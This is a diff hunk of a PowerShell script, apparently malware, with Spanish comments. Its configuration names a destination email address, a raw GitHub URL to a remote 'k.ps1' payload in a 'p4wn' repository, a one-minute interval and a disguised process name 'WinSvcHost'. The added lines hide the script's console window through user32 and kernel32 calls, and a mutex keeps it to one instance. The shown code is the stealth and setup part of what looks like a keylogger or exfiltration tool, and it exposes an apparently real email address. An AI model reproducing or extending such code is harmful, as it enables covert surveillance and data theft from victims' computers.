@@ -4,6 +4,9 @@ $Destino = 'adriancorreagutierrez@gmail.com'
 $Url     = 'https://raw.githubusercontent.com/adriancorreagutierrez-stack/p4wn/main/k.ps1'
 $Minutos = 1
 $Nombre  = 'WinSvcHost'
+# Oculta su propia ventana de consola
+Add-Type -MemberDefinition '[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr h, int c); [DllImport("kernel32.dll")] public static extern IntPtr GetConsoleWindow();' -Name Ven -Namespace Win
+[void][Win.Ven]::ShowWindow([Win.Ven]::GetConsoleWindow(), 0)
 
 $soloUno = New-Object System.Threading.Mutex($false, "Local\$Nombre")
 if (-not $soloUno.WaitOne(0)) { exit }
